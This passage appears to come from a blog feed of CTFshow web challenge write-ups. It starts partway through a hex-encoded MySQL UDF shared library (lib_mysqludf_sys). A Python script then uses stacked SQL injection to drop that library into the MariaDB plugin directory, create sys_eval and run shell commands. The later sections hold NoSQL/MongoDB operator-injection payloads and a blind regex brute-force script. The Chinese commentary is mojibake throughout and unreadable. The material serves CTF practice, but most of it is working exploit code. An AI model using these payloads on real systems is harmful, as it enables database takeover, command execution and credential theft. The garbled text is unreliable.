9625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">21510</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    end <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">5000</span>    payload<span class="token punctuation">.</span>append<span class="token punctuation">(</span>udf<span class="token punctuation">[</span>i<span class="token punctuation">:</span>end<span class="token punctuation">]</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> t <span class="token keyword">in</span> text<span class="token punctuation">:</span>    url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">"?id=';select unhex('&#123;&#125;') into dumpfile '/usr/lib/mariadb/plugin/&#123;&#125;.txt'--+&amp;page=1&amp;limit=10"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        p<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span>  <span class="token comment"># UDFææƒä¸€èˆ¬é…åˆdumpfile è€Œä¸æ˜¯outfile</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span>next_url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">"?id=';select concat(load_file('/usr/lib/mariadb/plugin/a.txt'),load_file('/usr/lib/mariadb/plugin/b.txt'),load_file('/usr/lib/mariadb/plugin/c.txt'),load_file('/usr/lib/mariadb/plugin/d.txt'),load_file('/usr/lib/mariadb/plugin/e.txt')) into dumpfile '/usr/lib/mariadb/plugin/udf.so'-- +&amp;page=1&amp;limit=10"</span>  <span class="token comment"># å°†å„ä¸ªtxtæ–‡ä»¶åˆå¹¶åˆ°udf.so</span>rn <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>next_url<span class="token punctuation">)</span>uaf_url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">"?id=';CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so';--+"</span>  <span class="token comment"># åˆ›å»ºudfå‡½æ•°</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>uaf_url<span class="token punctuation">)</span>nn_url <span class="token operator">=</span> base_url <span class="token operator">+</span> <span class="token string">"?id=';select sys_eval('cat /flag.*');-- +&amp;page=1&amp;limit=10"</span>  <span class="token comment"># æ‰§è¡Œå‘½ä»¤å¹¶æŸ¥çœ‹</span>rnn <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>nn_url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rnn<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><h4 id="web249-nosql"><a href="#web249-nosql" class="headerlink" title="web249(nosql)"></a>web249(nosql)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$memcache</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><a href="https://www.anquanke.com/post/id/97211">å†·é—¨çŸ¥è¯† â€” NoSQLæ³¨å…¥çŸ¥å¤šå°‘</a></p><p><a href="http://rui0.cn/archives/609">NoSQLæ³¨å…¥å°ç¬”è®°</a></p><p><strong>Memcached get</strong> å‘½ä»¤è·å–å­˜å‚¨åœ¨ <strong>key(é”®)</strong> ä¸­çš„ <strong>value(æ•°æ®å€¼)</strong> ï¼Œå¦‚æœ key ä¸å­˜åœ¨ï¼Œåˆ™è¿”å›ç©ºã€‚</p><p>è¡¥å……ä¸€ä¸‹çŸ¥è¯†ï¼š</p><pre class="language-sql" data-language="sql"><code class="language-sql">$gt : <span class="token operator">></span>$lt : <span class="token operator">&lt;</span>$gte: <span class="token operator">>=</span>$lte: <span class="token operator">&lt;=</span>$ne : <span class="token operator">!=</span>ã€<span class="token operator">&lt;></span>$<span class="token operator">in</span> : <span class="token operator">in</span>$nin: <span class="token operator">not</span> <span class="token operator">in</span>$<span class="token keyword">all</span>: <span class="token keyword">all</span> $<span class="token operator">or</span>:<span class="token operator">or</span>$<span class="token operator">not</span>: ååŒ¹é…<span class="token punctuation">(</span><span class="token number">1.3</span><span class="token number">.3</span>åŠä»¥ä¸Šç‰ˆæœ¬<span class="token punctuation">)</span>æ¨¡ç³ŠæŸ¥è¯¢ç”¨æ­£åˆ™å¼ï¼šdb<span class="token punctuation">.</span>customer<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;<span class="token string">'name'</span>: &#123;<span class="token string">'$regex'</span>:<span class="token string">'.*s.*'</span>&#125; &#125;<span class="token punctuation">)</span><span class="token comment">/*** : èŒƒå›´æŸ¥è¯¢ &#123; "age" : &#123; "$gte" : 2 , "$lte" : 21&#125;&#125;* : $ne &#123; "age" : &#123; "$ne" : 23&#125;&#125;* : $lt &#123; "age" : &#123; "$lt" : 23&#125;&#125;*/</span><span class="token comment">//æŸ¥è¯¢age = 22çš„è®°å½•</span>db<span class="token punctuation">.</span>userInfo<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;<span class="token string">"age"</span>: <span class="token number">22</span>&#125;<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç›¸å½“äºï¼šselect * from userInfo where age = 22;</span><span class="token comment">//æŸ¥è¯¢age > 22çš„è®°å½•</span>db<span class="token punctuation">.</span>userInfo<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;age: &#123;$gt: <span class="token number">22</span>&#125;&#125;<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ç›¸å½“äºï¼šselect * from userInfo where age > 22;</span></code></pre><p><code>id=flag</code> ä¸è¡Œï¼Œid éƒ½æ˜¯æ•°å­—ï¼Œå°è¯•æ•°ç»„ç»•è¿‡å¾—åˆ° flag <code>id[]=flag</code></p><h4 id="web250-MongoDB"><a href="#web250-MongoDB" class="headerlink" title="web250(MongoDB)"></a>web250(MongoDB)</h4><p>sqlè¯­å¥</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cursor</span> <span class="token operator">=</span> <span class="token variable">$manager</span><span class="token operator">-></span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ctfshow.ctfshow_user'</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//æ— è¿‡æ»¤</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$cursor</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'ç™»é™†æˆåŠŸ'</span><span class="token punctuation">;</span>  <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    </code></pre><p>MongoDBæ˜¯NOSQLçš„ä¸€ç§ï¼Œä»‹ç»ä¸€ä¸‹Mongodbå¾—ä¸¤ä¸ªæ“ä½œç¬¦ï¼š<br><code>$ne</code>ï¼š!&#x3D; ä¸ç­‰äº<br><code>$regex</code>ï¼šæ­£åˆ™åŒ¹é…</p><pre class="language-php" data-language="php"><code class="language-php">username<span class="token punctuation">[</span><span class="token variable">$ne</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>password<span class="token punctuation">[</span><span class="token variable">$ne</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>username<span class="token punctuation">[</span><span class="token variable">$regex</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">.</span><span class="token operator">&amp;</span>password<span class="token punctuation">[</span><span class="token variable">$regex</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">.</span></code></pre><p>å¦‚æœè¾“å…¥<code>value[$ne]=1</code>ä¹Ÿå°±æ„å‘³ç€<code>value=array($ne=&gt;1)</code>ï¼Œåœ¨MongoDBä¸­ï¼ŒåŸæ¥çš„ä¸€ä¸ªå•ä¸ªç›®æ ‡çš„æŸ¥è¯¢å˜æˆäº†æ¡ä»¶æŸ¥è¯¢ã€‚åŒæ ·çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨<code>username[$gt]=&amp;password[$gt]=</code>ä½œä¸ºpayloadè¿›è¡Œæ”»å‡»ã€‚</p><h4 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h4><p>åŒä¸Š</p><h4 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h4><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//sql</span>db<span class="token punctuation">.</span>ctfshow_user<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;username:<span class="token string">'$username'</span><span class="token punctuation">,</span>password:<span class="token string">'$password'</span>&#125;<span class="token punctuation">)</span><span class="token punctuation">.</span>pretty<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>åŒæ—¶ä¸èƒ½æ˜¯ adminå’Œ admin1ï¼Œæ­£åˆ™ç»•è¿‡<br>payload: <code>username[$regex]=^[^admin].*&amp;password[$ne]=1</code></p><h4 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h4><p>username&#x3D;flagæ—¶è¿”å›ç™»é™†æˆåŠŸï¼Œä½†æ²¡æœ‰å¯†ç ï¼Œè€ƒè™‘ç›²æ³¨çˆ†å‡ºå¯†ç </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'https://2eb32fc2-5457-44b4-b948-b0c416a768c8.challenge.ctf.show/api/'</span>flag <span class="token operator">=</span> <span class="token string">''</span>flag_dic <span class="token operator">=</span> <span class="token string">"ctfshow&#123;&#125;1234567890-poiuytrrewqasdfghjklmnbvcxz"</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> flag_dic<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"username[$regex]"</span><span class="token punctuation">:</span> <span class="token string">"flag"</span><span class="token punctuation">,</span>            <span class="token string">"password[$regex]"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token operator">+</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> response<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"ç™»é™†æˆåŠŸ"</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag<span class="token operator">+</span>i            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token string">'&#125;'</span><span class="token punctuation">:</span>                exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> Sqlæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webå…¥é—¨-upload</title>
      <link href="/2024/07/02/web%E5%85%A5%E9%97%A8-upload/"/>
      <url>/2024/07/02/web%E5%85%A5%E9%97%A8-upload/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p><a href="https://blog.csdn.net/qq_43390703/article/details/104858705">æ–‡ä»¶ä¸Šä¼ æ¼æ´ (ä¸Šä¼ çŸ¥è¯†ç‚¹ã€é¢˜å‹æ€»ç»“å¤§å…¨-uploadé¶åœºå…¨è§£)</a></p><h4 id="äº§ç”Ÿæ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸå› "><a href="#äº§ç”Ÿæ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸå› " class="headerlink" title="äº§ç”Ÿæ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸå› "></a>äº§ç”Ÿæ–‡ä»¶ä¸Šä¼ æ¼æ´çš„åŸå› </h4><p><strong>åŸå› ï¼š</strong></p><ul><li>å¯¹äºä¸Šä¼ æ–‡ä»¶çš„åç¼€åï¼ˆæ‰©å±•åï¼‰æ²¡æœ‰åšè¾ƒä¸ºä¸¥æ ¼çš„é™åˆ¶</li><li>å¯¹äºä¸Šä¼ æ–‡ä»¶çš„MIMETYPE(ç”¨äºæè¿°æ–‡ä»¶çš„ç±»å‹çš„ä¸€ç§è¡¨è¿°æ–¹æ³•) æ²¡æœ‰åšæ£€æŸ¥</li><li>æƒé™ä¸Šæ²¡æœ‰å¯¹äºä¸Šä¼ çš„æ–‡ä»¶ç›®å½•è®¾ç½®ä¸å¯æ‰§è¡Œæƒé™ï¼Œï¼ˆå°¤å…¶æ˜¯å¯¹äºshebangç±»å‹çš„æ–‡ä»¶ï¼‰</li><li>å¯¹äºweb serverå¯¹äºä¸Šä¼ æ–‡ä»¶æˆ–è€…æŒ‡å®šç›®å½•çš„è¡Œä¸ºæ²¡æœ‰åšé™åˆ¶</li></ul><p><strong>åŸç†ï¼š</strong><br>åœ¨ WEB ä¸­è¿›è¡Œæ–‡ä»¶ä¸Šä¼ çš„åŸç†æ˜¯é€šè¿‡å°†è¡¨å•è®¾ä¸º multipart&#x2F;form-dataï¼ŒåŒæ—¶åŠ å…¥æ–‡ä»¶åŸŸï¼Œè€Œåé€šè¿‡ HTTP åè®®å°†æ–‡ä»¶å†…å®¹å‘é€åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨ç«¯è¯»å–è¿™ä¸ªåˆ†æ®µ (multipart) çš„æ•°æ®ä¿¡æ¯ï¼Œå¹¶å°†å…¶ä¸­çš„æ–‡ä»¶å†…å®¹æå–å‡ºæ¥å¹¶ä¿å­˜çš„ã€‚é€šå¸¸ï¼Œåœ¨è¿›è¡Œæ–‡ä»¶ä¿å­˜çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨ç«¯ä¼šè¯»å–æ–‡ä»¶çš„åŸå§‹æ–‡ä»¶åï¼Œå¹¶ä»è¿™ä¸ªåŸå§‹æ–‡ä»¶åä¸­å¾—å‡ºæ–‡ä»¶çš„æ‰©å±•åï¼Œè€Œåéšæœºä¸ºæ–‡ä»¶èµ·ä¸€ä¸ªæ–‡ä»¶å ( ä¸ºäº†é˜²æ­¢é‡å¤ )ï¼Œå¹¶ä¸”åŠ ä¸ŠåŸå§‹æ–‡ä»¶çš„æ‰©å±•åæ¥ä¿å­˜åˆ°æœåŠ¡å™¨ä¸Š</p><p>æ–‡ä»¶ä¸Šä¼ åå¯¼è‡´çš„å¸¸è§å®‰å…¨é—®é¢˜ä¸€èˆ¬æœ‰:</p><ul><li><p>ä¸Šä¼ æ–‡ä»¶æ˜¯Webè„šæœ¬è¯­è¨€ï¼ŒæœåŠ¡å™¨çš„Webå®¹å™¨è§£é‡Šå¹¶æ‰§è¡Œäº†ç”¨æˆ·ä¸Šä¼ çš„è„šæœ¬,å¯¼è‡´ä»£<br>ç æ‰§è¡Œ;</p></li><li><p>ä¸Šä¼ æ–‡ä»¶æ˜¯Flashçš„ç­–ç•¥æ–‡ä»¶crossdomain.xml,é»‘å®¢ç”¨ä»¥æ§åˆ¶Flashåœ¨è¯¥åŸŸä¸‹çš„è¡Œä¸º(å…¶<br>ä»–é€šè¿‡ç±»ä¼¼æ–¹å¼æ§åˆ¶ç­–ç•¥æ–‡ä»¶çš„æƒ…å†µç±»ä¼¼);</p></li><li><p>ä¸Šä¼ æ–‡ä»¶æ˜¯ç—…æ¯’ã€æœ¨é©¬æ–‡ä»¶ï¼Œé»‘å®¢ç”¨ä»¥è¯±éª—ç”¨æˆ·æˆ–è€…ç®¡ç†å‘˜ä¸‹è½½æ‰§è¡Œ:</p></li><li><p>ä¸Šä¼ æ–‡ä»¶æ˜¯é’“é±¼å›¾ç‰‡æˆ–ä¸ºåŒ…å«äº†è„šæœ¬çš„å›¾ç‰‡ï¼Œåœ¨æŸäº›ç‰ˆæœ¬çš„æµè§ˆå™¨ä¸­ä¼šè¢«ä½œä¸ºè„šæœ¬æ‰§<br>è¡Œï¼Œè¢«ç”¨äºé’“é±¼å’Œæ¬ºè¯ˆã€‚</p></li><li><p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€äº›ä¸å¸¸è§çš„åˆ©ç”¨æ–¹æ³•ï¼Œæ¯”å¦‚å°†ä¸Šä¼ æ–‡ä»¶ä½œä¸ºä¸€ä¸ªå…¥å£,æº¢å‡ºæœåŠ¡å™¨çš„åå°å¤„ç†ç¨‹åºï¼Œå¦‚å›¾ç‰‡è§£ææ¨¡å—;æˆ–è€…ä¸Šä¼ -ä¸€ä¸ªåˆæ³•çš„æ–‡æœ¬æ–‡ä»¶ï¼Œ å…¶å†…å®¹åŒ…å«äº†PHPè„šæœ¬ï¼Œå†é€šè¿‡â€œæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´(Local File Include)â€æ‰§è¡Œæ­¤è„šæœ¬;ç­‰ç­‰ã€‚æ­¤ç±»é—®é¢˜ä¸åœ¨æ­¤ç»†è¿°ã€‚</p></li></ul><h4 id="å¸¸ç”¨çš„ä¸€å¥è¯æœ¨é©¬"><a href="#å¸¸ç”¨çš„ä¸€å¥è¯æœ¨é©¬" class="headerlink" 